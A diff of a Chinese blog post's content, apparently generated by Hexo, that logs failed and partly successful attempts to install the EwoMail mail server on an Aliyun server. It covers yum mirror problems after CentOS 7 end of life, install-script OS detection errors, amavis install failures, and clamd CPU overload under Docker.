-    <content><![CDATA[<h1 id="阿里云服务器本地尝试搭建ewomail失败："><a href="#阿里云服务器本地尝试搭建ewomail失败：" class="headerlink" title="阿里云服务器本地尝试搭建ewomail失败："></a>阿里云服务器本地尝试搭建ewomail失败：</h1><p>遇到报错：<br>1.python3.6中的一个加解密模块报错显示版本不再支持3.6<br>2.使用git或wget安装一键遇到问题<br>3.arguments参数报错<br>4.yum安装时遇到下载失败或部分包无法下载<br>5。安装ewomail时遇到amivasd的软件无法安装<br>报错原因：<br>第一个为使用yum依赖的是python3.6版本，安装高版本python3.8不能解决问题，一般可以无视<br>第二个问题为无法访问外网资源，可指定国内镜像安装<br>第三个是因为下载的ewomail一键安装脚本内的版本判断为centos7&#x2F;8，而阿里云服务器为alibaba release 3，脚本识别失败报错<br>第四个是因为yum源未使用正确，且CentOS Linux 7 已经于 2024 年 6 月 30 日终止生命周期。大部分yum源已失效，可更换阿里云centos历史归档镜像源：<a href="https://mirrors.aliyun.com/centos-vault/?spm=a2c6h.25603864.0.0.4a41714fmPcm3B">https://mirrors.aliyun.com/centos-vault/?spm=a2c6h.25603864.0.0.4a41714fmPcm3B</a><br>第五个尝试使用对应版本镜像源安装amavis失败，于是打算用docker搭建ewomail</p>
+    <content><![CDATA[<h1 id="阿里云服务器本地尝试搭建ewomail失败："><a href="#阿里云服务器本地尝试搭建ewomail失败：" class="headerlink" title="阿里云服务器本地尝试搭建ewomail失败："></a>阿里云服务器本地尝试搭建ewomail失败：</h1><p>遇到报错：<br>1.python3.6中的一个加解密模块报错显示版本不再支持3.6<br>2.使用git或wget安装一键遇到问题<br>3.arguments参数报错<br>4.yum安装时遇到下载失败或部分包无法下载<br>5。安装ewomail时遇到amivasd的软件无法安装<br>报错原因：<br>第一个为使用yum依赖的是python3.6版本，安装高版本python3.8不能解决问题，一般可以无视<br>第二个问题为无法访问外网资源，可指定国内镜像安装<br>第三个是因为下载的ewomail一键安装脚本内的版本判断为centos7&#x2F;8，而阿里云服务器为alibaba release 3，脚本识别失败报错<br>第四个是因为yum源未使用正确，且CentOS Linux 7 已经于 2024 年 6 月 30 日终止生命周期。大部分yum源已失效，可更换<a href="https://mirrors.aliyun.com/centos-vault/?spm=a2c6h.25603864.0.0.4a41714fmPcm3B">阿里云centos历史归档镜像源</a><br>第五个尝试使用对应版本镜像源安装amavis失败，于是打算用docker搭建ewomail</p>
 <h1 id="阿里云服务器docker搭建ewomail成功but服务器硬盘容量不够"><a href="#阿里云服务器docker搭建ewomail成功but服务器硬盘容量不够" class="headerlink" title="阿里云服务器docker搭建ewomail成功but服务器硬盘容量不够"></a>阿里云服务器docker搭建ewomail成功but服务器硬盘容量不够</h1><p>安装docker-&gt;docker pull 镜像-&gt;输入命令启动ewomail容器（成功）<br>或<br>安装docker和docker-compose-&gt;生成docker-compose.yml文件并配置-&gt;docker-compose -f指定yml文件 up -d运行启动容器（失败）<br>阿里云服务器拉取成功，BUT：<br>因为购买的阿里云服务器拉取的镜像ewomail内的软件amavis（反垃圾反病毒）因为容器自启动，导致电脑卡死，查看云服务器发现cpu占用率100%，使用top查看资源占用率发现amavis用户下的command clamd的cpu占用率80%。</p>
 <h1 id="纯净环境-版本centos7-7-1908-啥都没有-的服务器本地搭建ewomial失败"><a href="#纯净环境-版本centos7-7-1908-啥都没有-的服务器本地搭建ewomial失败" class="headerlink" title="纯净环境&#x2F;版本centos7.7 1908&#x2F;啥都没有 的服务器本地搭建ewomial失败"></a>纯净环境&#x2F;版本centos7.7 1908&#x2F;啥都没有 的服务器本地搭建ewomial失败</h1><p>遇到报错：<br>python2.7太低，不过yum还能用，尝试使用对应历史版本7.7 1908安装后搭建失败<br>ewomail脚本启动倒是没报错，不过还是关于amavis相关的三个包安装失败</p>
 <p>考虑到换了很多yum源仍然安装失败，最终计划使用docker提供的容器运行</p>
